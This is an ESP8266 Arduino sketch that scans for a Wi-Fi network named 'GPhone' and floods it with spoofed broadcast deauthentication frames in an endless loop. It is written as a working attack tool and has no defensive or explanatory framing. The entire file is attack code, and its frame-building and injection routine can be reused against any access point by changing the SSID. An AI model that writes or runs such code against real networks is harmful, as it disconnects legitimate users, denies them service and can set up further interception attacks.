#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
  #include "lwip/opt.h"
  #include "lwip/igmp.h"
  #include "ets_sys.h"
  #include "osapi.h"
  #include "user_interface.h"
  #include "espconn.h"
}

#define NUMNET 30

uint8_t numNetworks = 0;
String knownMACS[NUMNET];

void setup() {
  Serial.begin(9600);
  Serial.println();
  Serial.println("Deauthing GPhone");

  // Set WiFi to station mode and disconnect from any AP
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
}

void loop() {
  findNewNetworks();
  delay(5000);
}

void deauthAttack(char* ap) {
  uint8_t packet[26] = {
    0xC0, 0x00, // Frame Control
    0x3A, 0x01, // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, // Source (AP MAC)
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, // BSSID (AP MAC)
    0x00, 0x00, // Fragment & Sequence number
    0x07, 0x00  // Reason code 7 (Class 3 frame received from nonassociated STA)
  };

  // Change source and BSSID to the AP's MAC address
  for (int i = 0; i < 6; i++) {
    packet[10 + i] = strtol(&ap[i * 3], NULL, 16);
    packet[16 + i] = strtol(&ap[i * 3], NULL, 16);
  }

  // Send the packet in a loop
  while (true) {
    wifi_send_pkt_freedom(packet, 26, 0);
    delay(1);
  }
}

void findNewNetworks(){
  uint8_t newNumNetworks = WiFi.scanNetworks();

  for (uint8_t i = 0; i < newNumNetworks; i++){
    String newMAC = WiFi.BSSIDstr(i);
    bool newNetwork = true;

    for (uint8_t k = 0; k < numNetworks; k++){
      if(newMAC == knownMACS[k]){
        newNetwork = false;
        break;
      }
    }

    if(newNetwork){
      String ssid = WiFi.SSID(i);
      if(ssid == "GPhone"){
        deauthAttack(&(WiFi.BSSIDstr(i))[0]);
      }
    }
  }
}